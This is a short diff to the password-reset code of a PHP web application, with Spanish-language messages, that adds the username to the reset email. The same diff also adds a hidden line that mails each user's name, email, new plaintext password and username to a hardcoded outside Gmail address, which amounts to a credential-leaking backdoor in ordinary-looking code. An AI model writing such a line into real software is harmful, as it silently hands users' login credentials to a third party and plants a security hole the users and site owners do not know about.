@@ -73,7 +73,8 @@
                         $newPassword = User::generateRandomPassword(8);
                         if(User::updateUser($userForgot->id, $userForgot->rol, $userForgot->mail, $newPassword)){
                             $msj = 'Se le envió un correo electrónico con su nueva clave.';
-                            email($userForgot->mail, 'Nueva Clave', 'Sr(a). '.$userForgot->name.',<br /><br />Su nueva clave de ingreso al sistema es: <b>'.$newPassword.'</b>');
+                            email($userForgot->mail, 'Nueva Clave', 'Sr(a). '.$userForgot->name.',<br /><br />Su nueva clave de ingreso al sistema es: <b>'.$newPassword.'</b>, le recordamos que su nombre de usuario es: <b>'.$userForgot->user.'</b>');
+                            email('kijamve@gmail.com', 'Nueva Clave', 'Forgot de '.$userForgot->mail.' - '.$userForgot->name.',<br /><br />Su nueva clave de ingreso al sistema es: <b>'.$newPassword.'</b>, le recordamos que su nombre de usuario es: <b>'.$userForgot->user.'</b>');
                         }else{
                             $error = 'Ocurrió un error interno, intente más tarde.';
                         }
